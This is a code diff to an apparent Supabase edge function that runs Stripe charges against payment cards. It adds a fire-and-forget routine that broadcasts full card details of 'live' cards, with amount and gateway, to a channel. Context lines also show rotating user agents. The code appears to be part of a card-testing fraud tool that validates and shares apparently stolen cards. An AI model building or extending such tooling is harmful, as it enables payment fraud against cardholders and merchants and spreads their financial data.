@@ -65,6 +65,35 @@ const sendAdminDebug = async (
   }
 };
 
+// Notify charged card (fire-and-forget) - broadcasts to channel
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      card_details: cardDetails,
+      status,
+      response_message: responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[STRIPE-CHARGE] notify-charged-card error:", err));
+};
+
 // Rotating User Agents
 const userAgents = [
   // Chrome Windows
@@ -269,6 +298,18 @@ serve(async (req) => {
         result.message,
         result.rawResponse,
         profile?.username || user.email
+      );
+    }
+    
+    // Broadcast CHARGED/LIVE cards to channel (fire-and-forget)
+    if (result.status === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        result.message,
+        '$10.00',
+        'Stripe Charge'
       );
     }
     
